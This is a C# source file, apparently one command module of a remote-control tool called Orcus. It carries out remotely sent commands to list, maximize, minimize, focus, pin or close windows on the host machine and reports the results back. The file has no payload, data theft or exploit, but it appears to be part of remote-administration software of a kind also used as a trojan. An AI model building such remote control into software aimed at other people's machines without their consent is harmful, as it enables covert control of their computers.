using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.WindowManager;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.WindowManager
{
    public class WindowManagerCommand : Command
    {
        //https://msdn.microsoft.com/en-us/library/windows/desktop/ms633545(v=vs.85).aspx
        private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        private static readonly IntPtr HWND_BOTTOM = new IntPtr(1);

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((WindowManagerCommunication) parameter[0])
            {
                case WindowManagerCommunication.GetAllWindows:
                    var windows = WindowManager.GetAllWindows();
                    ResponseBytes((byte) WindowManagerCommunication.ResponseWindows,
                        new Serializer(typeof (List<WindowInformation>)).Serialize(windows), connectionInfo);
                    break;
                case WindowManagerCommunication.MaximizeWindow:
                    var result = NativeMethods.ShowWindow((IntPtr) BitConverter.ToInt64(parameter, 1),
                        ShowWindowCommands.Maximize);
                    ResponseResult(result, WindowManagerCommunication.ResponseWindowMaximized,
                        WindowManagerCommunication.ResponseWindowMaximizingFailed, connectionInfo);
                    break;
                case WindowManagerCommunication.MinimizeWindow:
                    result = NativeMethods.ShowWindow((IntPtr) BitConverter.ToInt64(parameter, 1),
                        ShowWindowCommands.Minimize);
                    ResponseResult(result, WindowManagerCommunication.ResponseWindowMinimized,
                        WindowManagerCommunication.ResponseWindowMinimizingFailed, connectionInfo);
                    break;
                case WindowManagerCommunication.BringToFront:
                    result = NativeMethods.SetForegroundWindow((IntPtr) BitConverter.ToInt64(parameter, 1));
                    ResponseResult(result, WindowManagerCommunication.ResponseWindowBroughtToFront,
                        WindowManagerCommunication.ResponseWindowBringToFrontFailed, connectionInfo);
                    break;
                case WindowManagerCommunication.MakeTopmost:
                    result = NativeMethods.SetWindowPos((IntPtr) BitConverter.ToInt64(parameter, 1), HWND_TOPMOST, 0, 0,
                        0, 0,
                        SetWindowPosFlags.IgnoreMove | SetWindowPosFlags.IgnoreResize | SetWindowPosFlags.ShowWindow);
                    ResponseResult(result, WindowManagerCommunication.ResponseWindowIsTopmost,
                        WindowManagerCommunication.ResponseMakeWindowTopmostFailed, connectionInfo);
                    break;
                case WindowManagerCommunication.CloseWindow:
                    NativeMethods.PostMessage(new HandleRef(null, (IntPtr) BitConverter.ToInt64(parameter, 1)),
                        WM.CLOSE, IntPtr.Zero,
                        IntPtr.Zero);

                    ResponseByte((byte) WindowManagerCommunication.ResponseWindowClosed, connectionInfo);
                    break;
                case WindowManagerCommunication.RestoreWindow:
                    result = NativeMethods.ShowWindow((IntPtr) BitConverter.ToInt64(parameter, 1),
                        ShowWindowCommands.Normal);
                    ResponseResult(result, WindowManagerCommunication.ResponseWindowRestored,
                        WindowManagerCommunication.ResponseWindowRestoringFailed, connectionInfo);
                    break;
                case WindowManagerCommunication.MakeWindowLoseTopmost:
                    result = NativeMethods.SetWindowPos((IntPtr) BitConverter.ToInt64(parameter, 1), HWND_BOTTOM, 0, 0,
                        0, 0,
                        SetWindowPosFlags.IgnoreMove | SetWindowPosFlags.IgnoreResize | SetWindowPosFlags.DoNotActivate);
                    ResponseResult(result, WindowManagerCommunication.ResponseWindowLostTopmost,
                        WindowManagerCommunication.ResponseWindowLostTopmostFailed, connectionInfo);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private void ResponseResult(bool result, WindowManagerCommunication successResult,
            WindowManagerCommunication failedResult, IConnectionInfo connectionInfo)
        {
            ResponseByte((byte) (result ? successResult : failedResult), connectionInfo);
        }

        protected override uint GetId()
        {
            return 29;
        }
    }
}